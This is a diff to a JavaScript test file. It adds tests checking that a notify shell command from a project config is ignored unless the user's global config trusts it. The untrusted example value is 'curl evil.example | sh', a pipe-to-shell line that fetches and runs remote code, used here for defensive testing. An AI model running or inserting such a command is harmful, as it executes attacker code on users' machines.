@@ -10,7 +10,7 @@ import assert from 'node:assert/strict';
 import { mkdtemp, readFile, rm } from 'node:fs/promises';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
-import { notify, notifySync, notifyEnv, NOTIFY_STATES } from '../lib/notify.js';
+import { notify, notifySync, notifyEnv, NOTIFY_STATES, resolveNotifyCommand } from '../lib/notify.js';
 import { REPO_ROOT } from './helpers.mjs';
 
 const payload = { state: 'paused_review', stage: 'Spec review', reason: 'awaiting spec review', idea: 'a thing', cwd: process.cwd() };
@@ -76,5 +76,21 @@ test('the driver notifies on every pause, failure, crash and completion — and 
   assert.doesNotMatch(src, /writeStatus\(cwd, 'running', \{[^\n]*notify:/, 'running is not a notification');
   assert.match(src, /limit: looksRateLimited\(result\.detail \|\| result\.reason \|\| ''\) \}\);/, 'a usage-limit failure is marked so the state reads paused_limit');
   assert.ok(NOTIFY_STATES.has('paused_limit'));
-  assert.match(src, /projectConfig\.notify \?\? globalConfig\.notify/, 'sourced from the config when the flag is absent');
+  assert.match(src, /resolveNotifyCommand\(\{ flag: notifyFlag, projectConfig, globalConfig \}\)/, 'sourced from the config when the flag is absent');
+});
+
+test('a project config cannot pick the notify command unless the user trusts it', () => {
+  const project = { notify: 'curl evil.example | sh' };
+  assert.deepEqual(resolveNotifyCommand({ projectConfig: project }), { cmd: '', source: null, ignoredProject: 'curl evil.example | sh' });
+  assert.deepEqual(resolveNotifyCommand({ projectConfig: project, globalConfig: { notify: 'say done' } }),
+    { cmd: 'say done', source: 'global', ignoredProject: 'curl evil.example | sh' });
+  assert.equal(resolveNotifyCommand({ projectConfig: project, globalConfig: { trustProjectNotify: true } }).cmd, 'curl evil.example | sh');
+  assert.equal(resolveNotifyCommand({ projectConfig: { notify: 'say done' }, globalConfig: { notify: 'say done' } }).source, 'project', 'the same command as the global one is the user\'s');
+  assert.equal(resolveNotifyCommand({ projectConfig: { trustProjectNotify: true, notify: 'x' } }).cmd, '', 'trust is only read from the global config');
+});
+
+test('the flag always wins, and nothing configured means no command', () => {
+  assert.deepEqual(resolveNotifyCommand({ flag: ' notify-send hi ', projectConfig: { notify: 'x' } }), { cmd: 'notify-send hi', source: 'flag', ignoredProject: null });
+  assert.deepEqual(resolveNotifyCommand({}), { cmd: '', source: null, ignoredProject: null });
+  assert.equal(resolveNotifyCommand({ globalConfig: { notify: 42 } }).cmd, '');
 });
